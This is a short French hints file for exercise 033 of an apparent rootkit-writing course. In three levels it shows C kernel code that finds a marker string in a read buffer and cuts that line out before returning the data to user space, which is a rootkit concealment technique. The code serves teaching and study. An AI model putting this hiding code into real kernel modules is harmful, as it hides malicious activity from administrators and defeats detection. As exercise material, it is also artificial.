# Hints, exercice 033

## Niveau 1

`strstr(kbuf, HIDE_MARKER)` retourne un pointeur vers la premiere
occurrence du marqueur dans le buffer, ou NULL si absent.

Pour trouver le debut de la ligne, remonte depuis ce pointeur vers
le \n precedent (ou le debut du buffer).

## Niveau 2

```c
char *match = strstr(kbuf, HIDE_MARKER);
if (match) {
    // Trouver le debut de la ligne
    line_start = match;
    while (line_start > kbuf && *(line_start - 1) != '\n')
        line_start--;

    // Trouver la fin de la ligne
    line_end = strchr(match, '\n');
    if (line_end)
        line_end++;  // inclure le \n
    else
        line_end = kbuf + ret;  // fin du buffer
}
```

## Niveau 3

```c
char *match = strstr(kbuf, HIDE_MARKER);
if (match) {
    line_start = match;
    while (line_start > kbuf && *(line_start - 1) != '\n')
        line_start--;

    line_end = strchr(match, '\n');
    if (line_end)
        line_end++;
    else
        line_end = kbuf + ret;

    line_len = line_end - line_start;
    memmove(line_start, line_end, (kbuf + ret) - line_end);
    ret -= line_len;

    if (copy_to_user(buf, kbuf, ret))
        pr_err("rootkitlings/033: copy_to_user failed\n");
}
```
